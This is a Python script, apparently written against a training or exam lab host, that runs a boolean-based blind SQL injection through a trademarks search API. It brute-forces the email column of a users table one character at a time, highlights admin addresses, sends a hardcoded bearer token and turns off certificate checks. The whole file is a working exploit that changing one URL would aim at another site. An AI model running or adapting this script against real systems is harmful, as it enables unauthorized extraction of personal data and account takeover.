import requests
from urllib.parse import quote
import urllib3
urllib3.disable_warnings()

BASE_URL = "https://ipkage.exam.cyberjutsu-lab.tech/api/trademarks?query="
HEADERS = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjNAZ21haWwuY29tIiwicm9sZSI6ImNsaWVudCIsImV4cCI6MTc2NTA4MDE2NH0._IDl96oaDyb1iPCQFQBuJG4d8VLVfL2d2D9r0mF1vhw",
    "User-Agent": "Mozilla/5.0"
}

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-"

def send(payload):
    url = BASE_URL + quote(payload)
    try:
        r = requests.get(url, headers=HEADERS, verify=False, timeout=1)
        return r.status_code == 200
    except:
        return False

def extract_email(offset):
    value = ""
    pos = 1
    print(f"Row {offset}: ", end="", flush=True)

    while True:
        found = False
        for c in CHARSET:
            payload = (
                f"test') AND 1214=("
                f"SELECT CASE WHEN SUBSTRING("
                f"(SELECT email FROM users ORDER BY id OFFSET {offset} LIMIT 1),"
                f"{pos},1)='{c}' THEN 1214 ELSE (SELECT 1 UNION SELECT 2) END"
                f")--"
            )
            if send(payload):
                value += c
                print(c, end="", flush=True)
                found = True
                break
        if not found:
            break
        pos += 1
    print()
    return value

# MAIN
print("[+] Dumping emails from 'users' table...\n")

offset = 0
while True:
    email = extract_email(offset)
    if email == "":
        break
    if "admin" in email.lower():
        print(f"🔥 ADMIN EMAIL FOUND → {email}")
    offset += 1
